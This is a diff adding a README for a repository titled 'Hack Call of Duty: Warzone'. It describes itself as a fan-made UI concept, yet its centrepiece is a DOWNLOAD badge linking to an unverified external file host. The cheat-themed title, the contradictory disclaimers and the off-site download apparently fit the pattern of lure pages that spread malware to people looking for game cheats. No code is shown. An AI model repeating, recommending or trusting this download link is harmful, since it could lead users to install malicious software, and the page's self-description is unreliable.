@@ -1,0 +1,50 @@
+
+# Hack Call of Duty: Warzone
+
+An unofficial fan-made UI concept inspired by Call of Duty: Warzone, featuring a modern military design and realistic battle royale visuals.
+
+[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-8A2BE2?style=for-the-badge&logo=gamepad&logoColor=white)](https://huangqing.net/s/file)
+
+> **Notice:** The download link is unverified and is not confirmed to host a working application.
+
+## Overview
+
+A visual project concept inspired by Warzone's military atmosphere, modern combat aesthetics, and competitive battle royale environment.
+
+## Features
+
+- Modern military interface
+- Customizable dark themes
+- Tactical visual elements
+- Organized menu sections
+- Clean dashboard layout
+
+## Menu Structure
+
+| Section | Description |
+|---|---|
+| Dashboard | Project overview |
+| Visual Theme | Interface customization |
+| Profiles | Manage visual presets |
+| Settings | Application preferences |
+| About | Project information |
+
+## Roadmap
+
+- [x] Define project concept
+- [x] Plan menu structure
+- [ ] Design dashboard
+- [ ] Add visual themes
+- [ ] Complete documentation
+
+## Disclaimer
+
+This is an unofficial fan-made project and is not affiliated with Activision or Call of Duty Studios.
+
+No functional cheats, gameplay modifications, or anti-cheat bypasses are provided. Unauthorized third-party tools may violate game rules and risk account penalties.
+
+## Project Information
+
+- **Project:** Hack Call of Duty: Warzone
+- **Category:** UI Design Concept
+- **Status:** Concept / In Development
